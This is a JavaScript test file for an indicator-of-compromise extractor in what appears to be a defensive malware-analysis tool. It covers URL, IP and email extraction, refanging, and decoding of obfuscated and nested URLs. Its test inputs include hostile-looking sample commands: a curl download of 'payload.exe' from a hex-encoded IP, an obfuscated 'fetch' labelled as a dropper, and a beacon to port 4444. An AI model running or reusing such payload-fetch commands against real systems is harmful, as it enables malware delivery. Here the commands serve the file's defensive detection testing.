'use strict';
// ioc-extract.test.js — coverage for `extractInterestingStringsCore`, the
// pure regex-based IOC extractor that runs in both the host (via
// `_extractInterestingStrings`) and the worker shim. Asserting these
// invariants here catches regressions in the worker bundle without
// having to spin up a Worker context.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

// `ioc-extract.js` references `IOC`, `safeRegex`, `looksLikeIpVersionString`
// and `stripDerTail` — all from `constants.js`. It also reaches for
// `UrlNormalizeUtil` (a typeof-guarded optional), used to surface the
// canonical form of obfuscated URLs alongside the original. Loading the
// three in this order mirrors the bundle's load order in `scripts/build.py`.
const ctx = loadModules(['src/constants.js', 'src/util/url-normalize.js', 'src/ioc-extract.js']);

const { extractInterestingStringsCore, IOC } = ctx;

/**
 * Helper: collect every `entry.url` whose `type === t` into a sorted array.
 * Sorting makes assertions deterministic regardless of regex match order.
 */
function valuesOfType(findings, t) {
  // `host()` projects vm-realm values into the test runner's realm so
  // assert.deepEqual prototype-identity checks pass. JSON-safe shape only.
  return host(findings.filter(e => e.type === t).map(e => e.url).sort());
}

test('ioc-extract: extracts plain URL with high severity', () => {
  const r = extractInterestingStringsCore(
    'A short note containing https://malicious.example.com/payload.exe and nothing else.'
  );
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.ok(urls.includes('https://malicious.example.com/payload.exe'),
    `expected URL in findings, got: ${JSON.stringify(urls)}`);
});

test('ioc-extract: extracts email address', () => {
  const r = extractInterestingStringsCore(
    'Forwarded by user@example.org for triage.'
  );
  const emails = valuesOfType(r.findings, IOC.EMAIL);
  assert.deepEqual(emails, ['user@example.org']);
});

test('ioc-extract: extracts IPv4 address', () => {
  const r = extractInterestingStringsCore(
    'Beacon to 192.0.2.55:4444 observed in capture.'
  );
  const ips = valuesOfType(r.findings, IOC.IP);
  assert.ok(ips.some(v => v.startsWith('192.0.2.55')),
    `expected 192.0.2.55 in IPs, got: ${JSON.stringify(ips)}`);
});

test('ioc-extract: refangs hxxps:// → https://', () => {
  // Refanging is a load-bearing analyst affordance: defanged IOCs in
  // threat-intel reports must surface as the canonical URL form. The
  // extractor should add a refanged URL annotated with note: 'Refanged'.
  const r = extractInterestingStringsCore('Indicator: hxxps://evil[.]example[.]com/abc');
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.ok(urls.includes('https://evil.example.com/abc'),
    `expected refanged URL, got: ${JSON.stringify(urls)}`);
  // Confirm the note is present on the refanged entry — it's how the
  // sidebar renders the "Refanged" tag the analyst sees.
  const refangedEntry = r.findings.find(e => e.type === IOC.URL && e.url === 'https://evil.example.com/abc');
  assert.equal(refangedEntry.note, 'Refanged');
});

test('ioc-extract: dedupes against pre-seeded existingValues', () => {
  // Renderers that already pushed an IOC (e.g. PE renderer pushed a URL
  // from the version-info table) pass `existingValues` so the string-scan
  // pass doesn't double-emit. Verify that path.
  const text = 'Already-seen URL: https://example.com/seen';
  const dup = extractInterestingStringsCore(text);
  assert.ok(valuesOfType(dup.findings, IOC.URL).includes('https://example.com/seen'));
  const dedup = extractInterestingStringsCore(text, { existingValues: ['https://example.com/seen'] });
  assert.equal(valuesOfType(dedup.findings, IOC.URL).length, 0);
});

test('ioc-extract: extractor returns shape with droppedByType / totalSeenByType', () => {
  // The shape is consumed by both the host shim and the worker; freezing
  // the surface here catches accidental key renames.
  const r = extractInterestingStringsCore('https://a.example.com');
  assert.ok(Array.isArray(r.findings), 'findings must be array');
  assert.ok(r.droppedByType instanceof Map, 'droppedByType must be Map');
  assert.ok(r.totalSeenByType instanceof Map, 'totalSeenByType must be Map');
});

test('ioc-extract: obfuscated URL emits both original and decoded entries', () => {
  // Hex-integer IP host wrapped in inline unicode escapes — the canonical
  // shape this feature was added to handle. The extractor should surface:
  //   • the original URL annotated as 'Obfuscated URL'
  //   • the decoded URL annotated 'Decoded from unicode-escape, numeric-ip'
  //   • a sibling IOC.IP for the dotted-quad host so GeoIP enrichment fires
  const r = extractInterestingStringsCore(
    'fetch("http://0\\u0078b5\\u00614c9/mh\\u0078"); // dropper'
  );
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.ok(
    urls.some(u => u.startsWith('http://0\\u0078b5')),
    `expected original obfuscated URL, got: ${JSON.stringify(urls)}`
  );
  assert.ok(
    urls.includes('http://0.181.164.201/mhx'),
    `expected decoded URL, got: ${JSON.stringify(urls)}`
  );
  // Sibling IP for the decoded host.
  const ips = valuesOfType(r.findings, IOC.IP);
  assert.ok(
    ips.includes('0.181.164.201'),
    `expected sibling IOC.IP for decoded host, got: ${JSON.stringify(ips)}`
  );
  // The decoded URL entry carries the 'Decoded from …' note.
  const decodedEntry = r.findings.find(
    e => e.type === IOC.URL && e.url === 'http://0.181.164.201/mhx'
  );
  assert.ok(decodedEntry, 'decoded URL entry must exist');
  assert.ok(/^Decoded from /.test(decodedEntry.note),
    `decoded entry note expected to start with "Decoded from ", got ${JSON.stringify(decodedEntry.note)}`);
});

test('ioc-extract: hex-integer IP URL is decoded', () => {
  // 0xC0A80101 = 192.168.1.1 — would normally be rejected by the strict
  // IPv4 scanner; the deobfuscation pass surfaces it via the URL path.
  const r = extractInterestingStringsCore('curl http://0xC0A80101/payload.exe');
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.ok(
    urls.includes('http://192.168.1.1/payload.exe'),
    `expected decoded hex-IP URL, got: ${JSON.stringify(urls)}`
  );
});

test('ioc-extract: plain URL is NOT duplicated into a decoded entry', () => {
  // Sanity: a fully clean URL must NOT trigger the obfuscation path.
  const r = extractInterestingStringsCore('https://example.com/foo');
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.deepEqual(urls, ['https://example.com/foo']);
});

test('ioc-extract: every finding uses an IOC.* constant for type', () => {
  // Bare strings ('url', 'ip', …) silently break the sidebar filter and
  // STIX/MISP exports — see CONTRIBUTING.md § IOC Push Checklist.
  // This test ensures the extractor never emits a bare-string type even
  // for inputs that exercise every branch.
  const text = [
    'https://evil.example.com/a',
    'mailto:x@y.example',
    '198.51.100.7',
    'C:\\Users\\v\\AppData\\Local\\Temp\\loader.bin',
    '\\\\fileserver\\share\\path',
    'HKLM\\Software\\Run\\Persist',
    'hxxps://defanged[.]example[.]com',
  ].join('\n');
  const r = extractInterestingStringsCore(text);
  const validTypes = new Set(Object.values(IOC));
  for (const e of r.findings) {
    assert.ok(validTypes.has(e.type),
      `non-IOC.* type leaked into findings: ${JSON.stringify(e)}`);
  }
});

// ── Nested-URL-in-query (ClickFix redirector pattern) ────────────────────────
//
// Outer URL on a benign-looking host carrying a percent-encoded inner URL
// in a query parameter. The extractor should surface BOTH URLs so the
// analyst gets the real C2 host, not just the redirector. See
// `processUrl::_scanNestedUrlsInQuery` in src/ioc-extract.js.

test('ioc-extract: nested URL in query param is decoded and surfaced', () => {
  const outer = 'https://example.com/a/b.php?a=https%3A%2F%2Fevil%2Ecom%2F%3Fpayload%3D98174912%26mode%3Dcaptcha';
  const r = extractInterestingStringsCore(`Visit ${outer} for details.`);
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.ok(urls.includes(outer),
    `expected outer URL in findings, got: ${JSON.stringify(urls)}`);
  const inner = 'https://evil.com/?payload=98174912&mode=captcha';
  assert.ok(urls.includes(inner),
    `expected inner URL '${inner}' in findings, got: ${JSON.stringify(urls)}`);
  const innerEntry = r.findings.find(
    e => e.type === IOC.URL && e.url === inner
  );
  assert.ok(innerEntry, 'inner URL entry must exist');
  assert.equal(innerEntry.severity, 'medium',
    `inner URL severity expected 'medium', got ${innerEntry.severity}`);
  assert.equal(innerEntry.note, 'Nested URL (query param)',
    `inner URL note expected 'Nested URL (query param)', got ${JSON.stringify(innerEntry.note)}`);
});

test('ioc-extract: nested-URL recursion is capped at depth 1', () => {
  // Pathological triple-nesting: ?a=https%3A%2F%2Fb.example%2F%3Fc%3Dhttps…
  // The outer and the first inner must both surface; any third-level URL
  // embedded inside the inner's query is NOT required to appear (cap).
  // This test anchors the depth invariant so fuzz-driven deeper nesting
  // can't blow up the hot loop.
  const innerInner = 'https://c.example/p';
  const inner = `https://b.example/?c=${encodeURIComponent(innerInner)}`;
  const outer = `https://a.example/?a=${encodeURIComponent(inner)}`;
  const r = extractInterestingStringsCore(`${outer}`);
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.ok(urls.includes(outer), `outer URL missing: ${JSON.stringify(urls)}`);
  assert.ok(urls.includes(inner), `first-level inner URL missing: ${JSON.stringify(urls)}`);
  // Depth cap: innerInner MUST NOT be surfaced (depth 2 blocked).
  assert.ok(!urls.includes(innerInner),
    `depth cap breach — innerInner should not be surfaced: ${JSON.stringify(urls)}`);
});

test('ioc-extract: plain URL with no query does NOT trigger nested scan', () => {
  // Fast-path anchor: a URL without a `?` should not run the decode helper.
  const r = extractInterestingStringsCore('https://clean.example.com/path/to/thing');
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.deepEqual(urls, ['https://clean.example.com/path/to/thing']);
});

test('ioc-extract: URL with non-URL query (%20 etc) does NOT trigger nested scan', () => {
  // Fast-path anchor: `?q=some%20search` has percent-encoding but no
  // URL-shape marker (`%3A%2F%2F` / `hxxp`), so the nested decode should
  // short-circuit and only the outer URL lands.
  const r = extractInterestingStringsCore(
    'fetch https://example.com/search?q=loupe%20security for reference.'
  );
  const urls = valuesOfType(r.findings, IOC.URL);
  assert.deepEqual(urls, ['https://example.com/search?q=loupe%20security']);
});

test('ioc-extract: core stays tldts-free — no IOC.DOMAIN emitted directly', () => {
  // Invariant: the core runs in both main and worker bundles. Emitting
  // IOC.DOMAIN from here would require tldts in the worker bundle, which
  // is a deliberate non-goal. The host-side `_backfillUrlSiblings` hook
  // covers domain-sibling derivation. Anchoring this here catches any
  // refactor that accidentally pulls tldts / pushIOC into the core.
  const r = extractInterestingStringsCore('https://example.com/a');
  const domains = r.findings.filter(e => e.type === IOC.DOMAIN);
  assert.equal(domains.length, 0,
    `core must not emit IOC.DOMAIN directly; got: ${JSON.stringify(domains)}`);
});

